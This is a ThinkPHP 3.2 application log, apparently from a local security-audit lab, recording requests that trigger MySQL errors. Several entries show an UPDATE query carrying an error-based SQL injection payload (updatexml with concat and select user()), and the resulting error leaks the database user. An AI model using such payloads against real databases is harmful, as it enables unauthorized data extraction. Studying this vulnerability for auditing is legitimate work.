[ 2019-04-05T11:28:58+08:00 ] 127.0.0.1 /shenji/thinkphp3.2/thinkphp/
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000044s ]
INFO: [ app_init ] --END-- [ RunTime:0.000243s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000563s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000739s ]
SQL: SHOW COLUMNS FROM `test` [ RunTime:0.0307s ]

[ 2019-04-05T11:29:02+08:00 ] 127.0.0.1 /shenji/thinkphp3.2/thinkphp/
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000033s ]
INFO: [ app_init ] --END-- [ RunTime:0.000186s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000563s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000757s ]
SQL: SHOW COLUMNS FROM `test` [ RunTime:0.0311s ]
ERR: 1105:XPATH syntax error: '~root@localhost~'
 [ SQL语句 ] : UPDATE `test` SET `name`='test',`password`='123' WHERE `name` = 'test' and updatexml(1,concat(0x7e,(select user()),0x7e),1)
ERR: 1105:XPATH syntax error: '~root@localhost~'
 [ SQL语句 ] : UPDATE `test` SET `name`='test',`password`='123' WHERE `name` = 'test' and updatexml(1,concat(0x7e,(select user()),0x7e),1)
NOTIC: [2] Cannot modify header information - headers already sent by (output started at D:\PhpStudy20180211\PHPTutorial\WWW\shenji\thinkphp3.2\ThinkPHP\Library\Think\Db\Driver.class.php:223) D:\PhpStudy20180211\PHPTutorial\WWW\shenji\thinkphp3.2\ThinkPHP\Library\Think\Think.class.php 第 230 行.
NOTIC: [2] Cannot modify header information - headers already sent by (output started at D:\PhpStudy20180211\PHPTutorial\WWW\shenji\thinkphp3.2\ThinkPHP\Library\Think\Db\Driver.class.php:223) D:\PhpStudy20180211\PHPTutorial\WWW\shenji\thinkphp3.2\ThinkPHP\Library\Think\Think.class.php 第 231 行.

[ 2019-04-05T11:34:31+08:00 ] 127.0.0.1 /shenji/thinkphp3.2/thinkphp/
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000038s ]
INFO: [ app_init ] --END-- [ RunTime:0.000208s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000585s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000758s ]
SQL: SHOW COLUMNS FROM `test` [ RunTime:0.0233s ]

[ 2019-04-05T11:36:24+08:00 ] 127.0.0.1 /shenji/thinkphp3.2/thinkphp/
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000220s ]
INFO: [ app_init ] --END-- [ RunTime:0.001070s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.001802s ]
INFO: [ app_begin ] --END-- [ RunTime:0.002384s ]
SQL: SHOW COLUMNS FROM `test` [ RunTime:0.0133s ]
ERR: 1105:XPATH syntax error: '~root@localhost~'
 [ SQL语句 ] : UPDATE `test` SET `name`='test',`password`='123' WHERE `name` = 'test' and updatexml(1,concat(0x7e,(select user()),0x7e),1)
ERR: 1105:XPATH syntax error: '~root@localhost~'
 [ SQL语句 ] : UPDATE `test` SET `name`='test',`password`='123' WHERE `name` = 'test' and updatexml(1,concat(0x7e,(select user()),0x7e),1)
NOTIC: [2] Cannot modify header information - headers already sent by (output started at D:\PhpStudy20180211\PHPTutorial\WWW\shenji\thinkphp3.2\ThinkPHP\Library\Think\Db\Driver.class.php:223) D:\PhpStudy20180211\PHPTutorial\WWW\shenji\thinkphp3.2\ThinkPHP\Library\Think\Think.class.php 第 230 行.
NOTIC: [2] Cannot modify header information - headers already sent by (output started at D:\PhpStudy20180211\PHPTutorial\WWW\shenji\thinkphp3.2\ThinkPHP\Library\Think\Db\Driver.class.php:223) D:\PhpStudy20180211\PHPTutorial\WWW\shenji\thinkphp3.2\ThinkPHP\Library\Think\Think.class.php 第 231 行.

[ 2019-04-05T11:36:42+08:00 ] 127.0.0.1 /shenji/thinkphp3.2/thinkphp/
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000038s ]
INFO: [ app_init ] --END-- [ RunTime:0.000205s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000555s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000731s ]
SQL: SHOW COLUMNS FROM `test` [ RunTime:0.0197s ]
ERR: 1105:XPATH syntax error: '~root@localhost~'
 [ SQL语句 ] : UPDATE `test` SET `name`='test',`password`='123' WHERE `name` = 'test' and updatexml(1,concat(0x7e,(select user()),0x7e),1)

[ 2019-04-05T11:36:59+08:00 ] 127.0.0.1 /shenji/thinkphp3.2/thinkphp/
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000037s ]
INFO: [ app_init ] --END-- [ RunTime:0.000198s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.001813s ]
INFO: [ app_begin ] --END-- [ RunTime:0.002283s ]
SQL: SHOW COLUMNS FROM `test` [ RunTime:0.0089s ]
ERR: 1105:XPATH syntax error: '~root@localhost~'
 [ SQL语句 ] : UPDATE `test` SET `name`='test',`password`='123' WHERE `name` = 'test' and updatexml(1,concat(0x7e,(select user()),0x7e),1)
ERR: 1105:XPATH syntax error: '~root@localhost~'
 [ SQL语句 ] : UPDATE `test` SET `name`='test',`password`='123' WHERE `name` = 'test' and updatexml(1,concat(0x7e,(select user()),0x7e),1)
NOTIC: [2] Cannot modify header information - headers already sent by (output started at D:\PhpStudy20180211\PHPTutorial\WWW\shenji\thinkphp3.2\ThinkPHP\Library\Think\Db\Driver.class.php:223) D:\PhpStudy20180211\PHPTutorial\WWW\shenji\thinkphp3.2\ThinkPHP\Library\Think\Think.class.php 第 230 行.
NOTIC: [2] Cannot modify header information - headers already sent by (output started at D:\PhpStudy20180211\PHPTutorial\WWW\shenji\thinkphp3.2\ThinkPHP\Library\Think\Db\Driver.class.php:223) D:\PhpStudy20180211\PHPTutorial\WWW\shenji\thinkphp3.2\ThinkPHP\Library\Think\Think.class.php 第 231 行.

[ 2019-04-05T11:38:56+08:00 ] 127.0.0.1 /shenji/thinkphp3.2/thinkphp/
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000038s ]
INFO: [ app_init ] --END-- [ RunTime:0.000207s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.002023s ]
INFO: [ app_begin ] --END-- [ RunTime:0.002321s ]
SQL: SHOW COLUMNS FROM `test` [ RunTime:0.0230s ]

[ 2019-04-05T11:39:41+08:00 ] 127.0.0.1 /shenji/thinkphp3.2/thinkphp/
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000037s ]
INFO: [ app_init ] --END-- [ RunTime:0.000206s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.002057s ]
INFO: [ app_begin ] --END-- [ RunTime:0.002437s ]
SQL: SHOW COLUMNS FROM `test` [ RunTime:0.0326s ]

[ 2019-04-05T11:47:20+08:00 ] 127.0.0.1 /shenji/thinkphp3.2/thinkphp/
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000079s ]
INFO: [ app_init ] --END-- [ RunTime:0.000422s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000769s ]
INFO: [ app_begin ] --END-- [ RunTime:0.001065s ]
SQL: SHOW COLUMNS FROM `test` [ RunTime:0.0208s ]
ERR: 1105:XPATH syntax error: '~root@localhost~'
 [ SQL语句 ] : UPDATE `test` SET `name`='test',`password`='123' WHERE `name` = 'test' and updatexml(1,concat(0x7e,(select user()),0x7e),1)

[ 2019-04-05T11:48:23+08:00 ] 127.0.0.1 /shenji/thinkphp3.2/thinkphp/
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000042s ]
INFO: [ app_init ] --END-- [ RunTime:0.000225s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000758s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000951s ]
SQL: SHOW COLUMNS FROM `test` [ RunTime:0.0125s ]
ERR: 1105:XPATH syntax error: '~root@localhost~'
 [ SQL语句 ] : UPDATE `test` SET `name`='test',`password`='123' WHERE `name` = 'test' and updatexml(1,concat(0x7e,(select user()),0x7e),1)

